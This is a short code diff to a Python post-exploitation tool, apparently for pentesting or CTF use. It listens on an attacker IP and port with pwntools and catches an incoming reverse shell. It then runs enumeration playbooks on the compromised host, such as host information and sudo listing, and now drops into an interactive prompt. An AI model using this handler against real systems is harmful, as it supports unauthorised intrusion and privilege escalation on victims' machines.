@@ -1,9 +1,10 @@
 import argparse
 import pwn
-import pheelshell
+import pheelprompt
 import playbooks.enumerate.basic_host_information
 import playbooks.enumerate.dependencies
 import playbooks.enumerate.sudo_list
+import pwnlib_socket_wrapper
 import utilities
 
 def main():
@@ -21,16 +22,19 @@ def main():
         playbooks.enumerate.sudo_list.EnumerateSudoList()
     ]
 
-    print(f'Listening {attacker_ip}:{args.port}...')
+    print(f'[listener] Listening {attacker_ip}:{args.port}...', end=' ')
     pwn.context.log_level = 'error'
     with pwn.listen(args.port).wait_for_connection() as client:
-        shell = pheelshell.PheelShell(client, b'$ ', attacker_ip)
+        print('Connected!')
+        shell = pwnlib_socket_wrapper.PwnlibSocketWrapper(client, b'$ ', attacker_ip)
 
         for playbook in active_playbooks:
             shell.run_playbook(playbook)
 
-    for playbook in active_playbooks:
-        print(str(playbook))
+        for playbook in active_playbooks:
+            print(str(playbook))
+
+        pheelprompt.prompt(shell)
 
 def pick_best_nic(ipv4s, target_ip):
     best_match = 0
